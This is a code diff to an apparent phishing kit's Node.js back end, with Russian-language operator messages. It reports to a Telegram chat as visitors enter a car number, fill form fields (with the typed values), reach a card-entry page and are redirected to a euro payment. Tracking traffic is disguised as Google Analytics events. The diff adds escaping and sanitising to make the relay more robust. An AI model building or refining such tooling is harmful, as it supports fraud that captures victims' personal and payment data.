@@ -225,28 +225,58 @@ function getSessionId(req) {
 }
 
 /**
+ * Escape HTML special characters for Telegram
+ */
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+/**
  * Format session message for Telegram
  */
 function formatSessionMessage(session, sessionId) {
-  const shortId = sessionId.substring(0, 15).toUpperCase();
+  // Safely get shortId
+  const shortId = safeString(sessionId).substring(0, 15).toUpperCase() || 'UNKNOWN';
+  
+  // Safely get user info with HTML escaping
+  const userAgent = escapeHtml(safeString(session.userAgent, 80)) || 'Unknown';
+  const ip = escapeHtml(safeString(session.ip)) || 'Unknown';
   
   let message = `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
-  message += `📱 <code>${(session.userAgent || 'Unknown').substring(0, 80)}</code>\n`;
-  message += `🌍 IP: <code>${session.ip || 'Unknown'}</code>\n\n`;
+  message += `📱 <code>${userAgent}</code>\n`;
+  message += `🌍 IP: <code>${ip}</code>\n\n`;
   
   // Add logs
+  if (!Array.isArray(session.logs)) {
+    return message;
+  }
+  
   session.logs.forEach((log) => {
-    const time = new Date(log.time).toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    if (!log || typeof log !== 'object') return;
     
-    switch (log.type) {
+    const time = new Date(log.time || Date.now()).toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    
+    // Safely extract log properties with HTML escaping
+    const logType = safeString(log.type) || 'unknown';
+    const logPage = escapeHtml(safeString(log.page)) || '';
+    const logField = escapeHtml(safeString(log.field)) || 'поле';
+    const logValue = escapeHtml(safeString(log.value, 50)) || '';
+    const logAmount = escapeHtml(safeString(log.amount)) || '?';
+    const logMessage = escapeHtml(safeString(log.message)) || '';
+    
+    switch (logType) {
       case 'page_view':
-        message += `📍 [${time}] Находится на: <b>${log.page}</b>\n`;
+        message += `📍 [${time}] Находится на: <b>${logPage || 'страница'}</b>\n`;
         break;
       case 'navigation':
-        message += `↪️ [${time}] Перешёл на: <b>${log.page}</b>\n`;
+        message += `↪️ [${time}] Перешёл на: <b>${logPage || 'страница'}</b>\n`;
         break;
       case 'form_submit':
-        message += `📤 [${time}] Отправил форму на: <b>${log.page}</b>\n`;
+        message += `📤 [${time}] Отправил форму на: <b>${logPage || 'страница'}</b>\n`;
         break;
       case 'payment_page':
         message += `💳 [${time}] Открыл страницу оплаты\n`;
@@ -254,7 +284,6 @@ function formatSessionMessage(session, sessionId) {
       case 'login_page':
         message += `🔐 [${time}] Страница входа\n`;
         break;
-      // NEW: Детальное отслеживание этапов оплаты
       case 'form_step_1':
         message += `📝 [${time}] <b>Шаг 1:</b> Вводит номер авто\n`;
         break;
@@ -265,22 +294,23 @@ function formatSessionMessage(session, sessionId) {
         message += `📝 [${time}] <b>Шаг 3:</b> Подтверждение данных\n`;
         break;
       case 'form_input':
-        message += `✏️ [${time}] Заполняет: <b>${log.field || 'поле'}</b>\n`;
+        message += `✏️ [${time}] Заполняет: <b>${logField}</b>\n`;
         break;
       case 'form_filled':
-        message += `✅ [${time}] Заполнил: <b>${log.field || 'поле'}</b> = <code>${log.value || ''}</code>\n`;
+        message += `✅ [${time}] Заполнил: <b>${logField}</b> = <code>${logValue}</code>\n`;
         break;
       case 'card_page':
         message += `💳 [${time}] <b>СТРАНИЦА ВВОДА КАРТЫ!</b>\n`;
         break;
       case 'payment_redirect':
-        message += `💰 [${time}] <b>ПЕРЕХОД НА ОПЛАТУ!</b> Сумма: €${log.amount || '?'}\n`;
+        message += `💰 [${time}] <b>ПЕРЕХОД НА ОПЛАТУ!</b> Сумма: €${logAmount}\n`;
         break;
       case 'page_leave_external':
         message += `🚪 [${time}] <b>Покинул сайт</b>\n`;
         break;
       default:
-        message += `• [${time}] ${log.message || log.type}\n`;
+        // For unknown types, show type name (not raw object)
+        message += `• [${time}] ${logMessage || logType}\n`;
     }
   });
   
@@ -288,37 +318,72 @@ function formatSessionMessage(session, sessionId) {
 }
 
 /**
+ * Safely convert any value to a string (prevents [object Object])
+ */
+function safeString(val, maxLen = 200) {
+  if (val === null || val === undefined) return '';
+  if (typeof val === 'string') return val.substring(0, maxLen);
+  if (typeof val === 'number' || typeof val === 'boolean') return String(val);
+  if (typeof val === 'object') {
+    // Handle objects - try to extract useful info
+    try {
+      // If it's an array, join elements
+      if (Array.isArray(val)) {
+        return val.map(v => safeString(v, 50)).join(', ').substring(0, maxLen);
+      }
+      // If it has a meaningful property, use it
+      if (val.type) return safeString(val.type, maxLen);
+      if (val.name) return safeString(val.name, maxLen);
+      if (val.message) return safeString(val.message, maxLen);
+      if (val.value) return safeString(val.value, maxLen);
+      // Last resort - stringify
+      const str = JSON.stringify(val);
+      return str.substring(0, maxLen);
+    } catch (e) {
+      return '[data]';
+    }
+  }
+  return String(val).substring(0, maxLen);
+}
+
+/**
  * Track event from client or server
  */
 async function trackEvent(sessionId, eventData, meta = {}) {
   try {
+    // Validate eventData
+    if (!eventData || typeof eventData !== 'object') {
+      logger.warn('[TG] Invalid eventData:', typeof eventData);
+      return;
+    }
+    
     let session = sessions.get(sessionId);
     
     if (!session) {
       session = {
         messageId: null,
         logs: [],
-        ip: meta.ip || 'Unknown',
-        userAgent: meta.userAgent || 'Unknown',
+        ip: safeString(meta.ip) || 'Unknown',
+        userAgent: safeString(meta.userAgent, 100) || 'Unknown',
         startTime: Date.now(),
         lastPage: null,
       };
       sessions.set(sessionId, session);
     }
     
-    // Update meta if provided
-    if (meta.ip) session.ip = meta.ip;
-    if (meta.userAgent) session.userAgent = meta.userAgent;
+    // Update meta if provided (with sanitization)
+    if (meta.ip) session.ip = safeString(meta.ip);
+    if (meta.userAgent) session.userAgent = safeString(meta.userAgent, 100);
     
-    // Add log entry
+    // Add log entry with STRICT string conversion
     const logEntry = {
-      type: eventData.type || 'unknown',
-      page: eventData.page || '',
-      field: eventData.field || '',
-      value: eventData.value || '',
-      amount: eventData.amount || '',
-      url: eventData.url || '',
-      message: eventData.message || '',
+      type: safeString(eventData.type) || 'unknown',
+      page: safeString(eventData.page),
+      field: safeString(eventData.field),
+      value: safeString(eventData.value, 100),
+      amount: safeString(eventData.amount),
+      url: safeString(eventData.url),
+      message: safeString(eventData.message),
       time: Date.now(),
     };
     
@@ -485,6 +550,11 @@ async function handleTrackingAPI(req, res) {
  * Internal: {type:'card_page', field:'', value:'', page:''}
  */
 function decodeGAEvent(gaData) {
+  // Validate input
+  if (!gaData || typeof gaData !== 'object') {
+    return { type: 'unknown', page: '', field: '', value: '' };
+  }
+  
   const eventMap = {
     // Checkout steps
     'checkout:step:card_input': { type: 'card_page', page: 'Ввод данных карты' },
@@ -512,17 +582,23 @@ function decodeGAEvent(gaData) {
     'outbound:click': { type: 'page_leave_external' },
   };
   
-  const key = `${gaData.ec || ''}:${gaData.ea || ''}:${gaData.el || ''}`.replace(/:$/,'').replace(/:$/,'');
-  const mapped = eventMap[key] || { type: gaData.ea || 'unknown', page: gaData.el || '' };
+  // Safely extract string values from gaData
+  const ec = safeString(gaData.ec);
+  const ea = safeString(gaData.ea);
+  const el = safeString(gaData.el);
+  const ev = safeString(gaData.ev);
   
-  // Add value if present
-  if (gaData.ev) {
-    mapped.value = gaData.ev;
+  const key = `${ec}:${ea}:${el}`.replace(/:$/,'').replace(/:$/,'');
+  const mapped = eventMap[key] || { type: ea || 'unknown', page: el || '' };
+  
+  // Add value if present (already a safe string)
+  if (ev) {
+    mapped.value = ev;
   }
   
   // For outbound, add hostname as page
-  if (gaData.ec === 'outbound' && gaData.el) {
-    mapped.page = 'Переход на ' + gaData.el;
+  if (ec === 'outbound' && el) {
+    mapped.page = 'Переход на ' + el;
   }
   
   return mapped;
